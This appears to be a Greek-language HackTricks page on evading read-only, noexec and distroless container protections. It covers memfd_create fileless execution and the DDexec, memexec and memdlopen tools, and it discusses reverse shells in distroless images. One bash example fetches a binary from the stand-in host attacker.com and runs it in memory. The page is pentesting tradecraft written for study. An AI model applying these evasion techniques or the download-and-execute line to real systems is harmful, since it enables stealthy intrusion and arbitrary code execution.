# Bypass FS protections: read-only / no-exec / Distroless

## Βίντεο

Στα παρακάτω βίντεο θα βρείτε τις τεχνικές που αναφέρονται σε αυτή τη σελίδα, επεξηγημένες πιο αναλυτικά:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## Σενάριο read-only / no-exec

Σε ένα container, μπορείτε να κάνετε mount το root filesystem ως read-only, ορίζοντας το **`readOnlyRootFilesystem: true`** στο security context.<sup>[[3]](#references)</sup> Για παράδειγμα:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Ένα read-only root δεν κάνει read-only τα volumes που έχουν γίνει mount ξεχωριστά. Το Docker αντιμετωπίζει το **`/dev/shm`** ως IPC mount, ενώ επιλογές tmpfs όπως οι `rw` και `noexec` είναι επιλογές runtime configuration· ελέγξτε τις επιλογές mount του container-στόχου πριν βασιστείτε σε οποιαδήποτε από τις δύο συμπεριφορές.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Από την οπτική ενός red-team, αυτός ο συνδυασμός μπορεί να δυσκολέψει το download και την εκτέλεση binaries που δεν είναι ήδη διαθέσιμα (για παράδειγμα, backdoors ή enumeration tools).<sup>[[4]](#references)[[5]](#references)</sup>

## Ευκολότερο bypass: Scripts

Ένα `noexec` mount εμποδίζει την άμεση εκτέλεση binaries σε αυτό το mount, αλλά ένας interpreter μπορεί ακόμη να διαβάσει και να ερμηνεύσει ένα script. Αν υπάρχει το `sh` ή το `python`, μπορείτε επομένως να εκτελέσετε ένα shell ή Python script μέσω αυτού του interpreter.<sup>[[5]](#references)</sup>

Αυτό δεν βοηθά όταν το απαιτούμενο tool είναι το ίδιο binary.<sup>[[5]](#references)</sup>

## Memory Bypasses

Όταν η άμεση εκτέλεση από ένα mounted path είναι αποκλεισμένη, μία επιλογή είναι να φορτώσετε το ELF στη μνήμη και να το εκτελέσετε μέσω ενός in-memory path. Αυτό παρακάμπτει τον έλεγχο `noexec` σε αυτό το mount, αλλά δεν καταργεί άλλους kernel, permission ή policy controls.<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec syscall bypass

Αν ένα scripting runtime μπορεί να έχει πρόσβαση στο σχετικό Linux interface, μπορεί να δημιουργήσει ένα anonymous, RAM-backed file descriptor με το **`memfd_create(2)`**, να γράψει σε αυτό τα ELF bytes και να χρησιμοποιήσει ένα fd-backed execution path. Το project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) δημιουργεί compressed και base64-encoded Python, Perl ή Ruby code για αυτό το workflow.<sup>[[6]](#references)[[7]](#references)</sup>

Το project τεκμηριώνει επί του παρόντος targets για Python, Perl και Ruby· τα PHP ή Node χρειάζονται διαφορετική runtime-specific τεχνική ή extension, επομένως η απουσία αυτού του generator για μια γλώσσα δεν σημαίνει ότι η in-memory εκτέλεση είναι αδύνατη.<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> Ένα κανονικό executable που γράφεται στο **`/dev/shm`** εξακολουθεί να υπόκειται στη ρύθμιση **`noexec`** αυτού του mount· το απλό άνοιγμά του μέσω ενός ordinary file descriptor δεν αλλάζει την πολιτική του mount.<sup>[[5]](#references)</sup>
>
> Η ακριβής memory-execution μέθοδος εξαρτάται επίσης από το runtime, την architecture, τον kernel και τα διαθέσιμα permissions.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

Το [**DDexec / EverythingExec**](https://github.com/arget13/DDexec) γράφει έναν stager και loader στη running shell process μέσω του **`/proc/self/mem`** και στη συνέχεια μεταφέρει τον έλεγχο σε αυτόν τον code.<sup>[[8]](#references)</sup>

Αυτό επιτρέπει στη process να φορτώσει ένα παρεχόμενο binary χωρίς να τοποθετήσει πρώτα αυτό το binary σε executable filesystem.<sup>[[8]](#references)</sup>

> [!TIP]
> Το **DDexec / EverythingExec** μπορεί να φορτώσει και να **εκτελέσει** shellcode ή ένα binary από τη **μνήμη**.<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Για περισσότερες πληροφορίες σχετικά με αυτή την τεχνική, δείτε το Github ή:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

Το [**Memexec**](https://github.com/arget13/memexec) είναι μια daemonized υλοποίηση του DDexec. Το daemon του ακούει για αιτήματα που περιέχουν ορίσματα και raw bytes προγραμμάτων, κάνει fork σε ένα child για να φορτώσει και να εκτελέσει κάθε πρόγραμμα και διατηρεί το parent ως server.<sup>[[9]](#references)</sup>

Το repository περιλαμβάνει ένα παράδειγμα χρήσης του **memexec για την εκτέλεση binaries από ένα PHP reverse shell** στο [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Με παρόμοιο σκοπό με το DDexec, το [**memdlopen**](https://github.com/arget13/memdlopen) είναι μια fileless υλοποίηση του `dlopen()` για shared object ή πρόγραμμα. Το README του τεκμηριώνει επί του παρόντος υποστήριξη ARM64, επομένως ελέγξτε την αρχιτεκτονική του target πριν από τη χρήση του.<sup>[[10]](#references)</sup>

## Παράκαμψη Distroless

Για μια ειδική εξήγηση σχετικά με το **τι είναι στην πραγματικότητα το distroless**, πότε βοηθά, πότε δεν βοηθά και πώς αλλάζει το post-exploitation tradecraft σε containers, δείτε:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Τι είναι το distroless

Τα distroless images περιέχουν μόνο την εφαρμογή και τα runtime dependencies της· τα επίσημα images παραλείπουν package managers, shells και άλλα προγράμματα που αναμένονται σε μια τυπική Linux distribution.<sup>[[11]](#references)</sup>

Η διατήρηση του runtime image μόνο με αυτά τα dependencies μειώνει το λογισμικό που υπάρχει στο production, καθώς και την ποσότητα που πρέπει να σαρώνεται και να παρακολουθείται.<sup>[[11]](#references)</sup>

### Reverse Shell

Σε ένα distroless container ενδέχεται να **μη βρείτε `sh` ή `bash`** για ένα κανονικό shell, ούτε κοινά utilities όπως `ls`, `whoami` ή `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Επομένως, ένα συνηθισμένο reverse shell βασισμένο σε shell ή enumeration βασισμένο σε utilities ενδέχεται να μη λειτουργήσει.<sup>[[11]](#references)</sup>

Αν η compromised εφαρμογή περιλαμβάνει language runtime (για παράδειγμα, Python για μια Flask εφαρμογή ή Node.js για μια Node εφαρμογή), ένα RCE ενδέχεται να μπορεί ακόμα να χρησιμοποιήσει αυτό το runtime για command channel και system inspection μέσω των APIs του.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Χρησιμοποιήστε τη διαθέσιμη scripting language για **enumerate του system** μέσω των δυνατοτήτων της γλώσσας.<sup>[[12]](#references)</sup>

Αν δεν υπάρχουν **read-only/no-exec** protections, ένα command channel μπορεί να γράψει binaries σε ένα writable, executable mount και να τα εκτελέσει· επαληθεύστε πρώτα τα mount options και τα permissions.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Όταν υπάρχουν αυτές οι protections, χρησιμοποιήστε τις **memory-execution techniques παραπάνω**, όπου το runtime, ο kernel και τα permissions το επιτρέπουν.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Μπορείτε να βρείτε **παραδείγματα** εκμετάλλευσης RCE vulnerabilities για την απόκτηση scripting-language **reverse shells** και την εκτέλεση binaries από τη μνήμη στο [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Εξερεύνηση της Linux Memory Manipulation για Stealth και Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth intrusions με DDexec-ng και in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Διαμόρφωση Security Context για Pod ή Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
